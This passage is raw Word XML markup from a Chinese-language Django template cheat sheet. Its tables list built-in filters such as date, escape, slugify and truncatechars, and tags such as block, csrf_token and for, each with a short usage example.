                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>长度</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="5A67E77E"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7F3D20C" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>default</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FCDEF73" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode34"/>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve">{{ value | default: "0" }} </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode34"/>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>默认值</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="38B183A5"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F28A902" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>date</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5E8A292" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ picture.date | date:"Y-m-j" }} 日期格式</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="78D7DD5B"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D142B29" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>dicsort</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9C86BAE" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ value | dicsort: "name" }} 字典排序</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="0E649E91"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C53E286" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>escape</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925E8E7" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ title | escape }} 转义</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="43CBC090"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523E071" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>filesizeformat</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C6618A2" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ file | filesizeformat }} 文件大小</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="2A58DDD8"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AA7399D" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>first, last</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C5A2C0D" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ list | first }} 首或尾</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="2C3909E4"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E436955" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>floatformat</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B2CAEC1" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ value | floatformat }} 浮点格式</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="25F576F9"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33D3956" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>get_digit</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ECD52FC" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ value | get_digit }} 位数</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="439E2C9A"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4E1F7D0" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>join</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BECB9BB" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ list | join: "," }} 字符连接</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="16C25DD7"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621D88D" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>make_list</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B7D736F" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ value | make_list }} 转字符串</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="64754D7E"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996C5F7" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>pluralize</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8356BCC" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ number | pluralize }} 复数</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="0971313F"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32AD98E" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>random</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DE8DCF4" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ list | random }} 随机</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="739E4BA9"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67AF5A2" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>slice</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62E2716" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ list | slice: ":2" }} 切</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="7F6B79A3"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AC975FA" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>slugify</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DBFBABB" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ title | slugify }} 转为slug</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="2CAAE9A1"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9265D05" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>striptags</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FCB7DEE" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ body | striptags }} 去除tags</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="4FC3AC2B"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3D19AFC" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>time</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B3372B1" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ value | time: "H:i" }} 时间格式</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="7F5AFD31"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0B0CC7C" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>timesince</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9A162E0" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ pub_date | timesince: given_date }}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="6E79A7D9"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0B04E7D" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>truncatechars</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6BFFDD4" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ title | truncatechars: 10 }} </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="2E7DA155" w14:textId="77777777" w:rsidTr="00995934">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>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C291702" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>truncatewords</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>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F648636" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ title | truncatewords: 2 }} </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="1F1795F5"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4A2F9F2" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>truncatechars_html</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B5B7802" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ title | truncatechars_html: 2 }}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="60766E88"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6E09871" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>urlencode</w:t>
            </w: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14508FB" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ path | urlencode }} URL转义</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="7760A0B0" w14:textId="77777777" w:rsidTr="00995934">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1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72CC383" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>wordcount</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A7B4015" w14:textId="6EF5CFAB" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="35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55635F4" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{{ body | wordcount }} 单词字数</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F7E6F58" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板标签Tags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70824F8B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00B96C81" w:rsidRDefault="00995934" w:rsidP="00B96C81">
      <w:pPr>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="888888"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>在Django模板里，变量是放在双括号</w:t>
      </w:r>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="888888"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>{{ }}</w:t>
      </w:r>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>里的，而代码是放在</w:t>
      </w:r>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="888888"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>{% tag_name %}</w:t>
      </w:r>
      <w:r w:rsidRPr="00B96C81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>标签里的。Django里有很多自带标签，可以满足绝大部分开发需求。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="10155" w:type="dxa"/>
        <w:jc w:val="center"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1329"/>
        <w:gridCol w:w="8826"/>
      </w:tblGrid>
      <w:tr w:rsidR="00995934" w14:paraId="4C172FA0"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23279C3" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode42"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>标签Tags</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57607D3" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode43"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>例子</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="40555EE7"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08ADE46" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>{% block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A7DF267" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% block content %} 代码块</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2CC9447E" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% endblock %}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="51F83473"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626A88C" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% csrf_token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41CDA87" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% csrf_token %} 表单专用</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="0F3C2670"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A00FD97" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% for %}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="530D4D37" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:pStyle w:val="a7"/>
              <w:wordWrap w:val="0"/>
              <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
            </w:pP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5EE791C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>&lt;ul&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A41B79A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% for athlete in athlete_list %}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26EBBAC3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;li&gt;{{ athlete.name }}&lt;/li&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="13D34C49" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% endfor %}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40581C22" w14:textId="3C689971" w:rsidR="00995934" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>&lt;/ul&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
